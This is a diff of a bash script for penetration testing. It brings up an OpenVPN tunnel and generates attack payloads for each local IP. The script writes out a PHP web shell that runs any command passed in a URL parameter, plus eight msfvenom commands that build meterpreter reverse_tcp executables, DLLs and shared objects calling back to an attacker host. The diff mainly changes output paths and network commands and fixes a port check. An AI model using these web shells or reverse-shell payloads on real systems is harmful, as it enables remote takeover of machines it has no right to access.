@@ -118,7 +118,7 @@ if [[ $vpnfile ]];then
     sudo unbuffer openvpn $vpnfile 2>&1 | tee $log/openvpn.log > /dev/null &
     sudo ln -s $log/openvpn.log $session/openvpn.stdout
     tput setaf 4;echo "[*] Waiting a bit for tunnelling to set up";tput sgr0
-    while [[ ! "$(ifconfig | grep tun)" ]]; do sleep .5; done
+    while [[ ! "$(ip a | grep tun)" ]]; do sleep .5; done
     tput setaf 4;echo "[*] Connexion to $(basename $vpnfile) done";tput sgr0
   else
     tput setaf 1;echo "[!] $vpnfile is not a valid file path";tput sgr0
@@ -151,14 +151,14 @@ generating-payloads() {
         echo "<html><body><form method=\"GET\" name=\"<?php echo basename(\$_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset(\$_GET[\"cmd\"])){system(\$_GET[\"cmd\"]);}?></pre></body></html>" > $dir/web_shell_comfort_php
 
         # meterpreter
-        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > windows_x64.exe 2>/dev/null
-        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > windows_x86.exe 2>/dev/null
-        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > linux_x64.exe 2>/dev/null
-        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > linux_x86.exe 2>/dev/null
-        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f dll > windows_x64.dll 2>/dev/null
-        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f dll > windows_x86.dll 2>/dev/null
-        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f elf-so > linux_x64.so 2>/dev/null
-        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f elf-so > linux_x86.so 2>/dev/null
+        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > $dir/meterpreter/windows_x64.exe 2>/dev/null
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > $dir/meterpreter/windows_x86.exe 2>/dev/null
+        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > $dir/meterpreter/linux_x64.exe 2>/dev/null
+        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f exe > $dir/meterpreter/linux_x86.exe 2>/dev/null
+        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f dll > $dir/meterpreter/windows_x64.dll 2>/dev/null
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f dll > $dir/meterpreter/windows_x86.dll 2>/dev/null
+        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f elf-so > $dir/meterpreter/linux_x64.so 2>/dev/null
+        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$port -f elf-so > $dir/meterpreter/linux_x86.so 2>/dev/null
 
 }
 
@@ -166,7 +166,7 @@ echo ""
 echo ""
 echo "[+] Generating payloads according to network configuration"
 
-for ip in $(ifconfig | grep "inet " | awk '{print($2)}');do
+for ip in $(ip a | grep "inet " | awk '{print($2)}' | cut -d'/' -f1);do
         echo "[*] Generating payloads for $ip:4444"
         generating-payloads $ip
 done
@@ -179,7 +179,7 @@ while [[ "$ip" ]];do
                 if [[ ! "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]];then echo "[!] '$ip' is not an ip in the format 0.0.0.0"
                 else
                         read -e -p "Attacker port > " port
-                        if [[ ! "$ip" =~ ^[0-9]{1,5}$ || $ip -gt 65535 ]];then echo "[!] '$port' is not a valid port";
+                        if [[ ! "$port" =~ ^[0-9]{1,5}$ || $ip -gt 65535 ]];then echo "[!] '$port' is not a valid port";
                         else echo "[*] Generating payloads for $ip:$port"; generating-payloads $ip $port; fi
                 fi
         fi
